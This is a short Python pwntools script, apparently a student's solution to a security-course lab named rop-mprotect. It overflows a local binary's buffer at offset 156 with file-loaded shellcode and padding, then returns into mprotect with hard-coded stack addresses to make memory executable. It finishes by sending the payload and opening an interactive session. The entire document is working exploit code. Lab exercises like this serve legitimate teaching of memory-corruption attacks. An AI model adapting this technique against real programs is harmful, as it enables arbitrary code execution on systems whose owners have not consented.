#!/usr/bin/env python
from pwn import *

offset = 156

mprotect = p32(0xf7edd660)
buf_addr = p32(0xffffd340)
buf_addr_fixed = p32(0xffffd000)

shellcode = ''

with open('shellcode.bin', 'r') as f:
    shellcode += f.readline()

buf = ''
buf += shellcode
buf += 'A' * (offset - len(shellcode))
buf += mprotect
buf += buf_addr
buf += buf_addr_fixed
buf += p32(0x1000)
buf += p32(7)

p = process('/home/student/lab5/rop-mprotect/rop-mprotect')

with open('input.txt', 'w') as f:
    f.write(buf)

p.send(buf)
p.interactive()
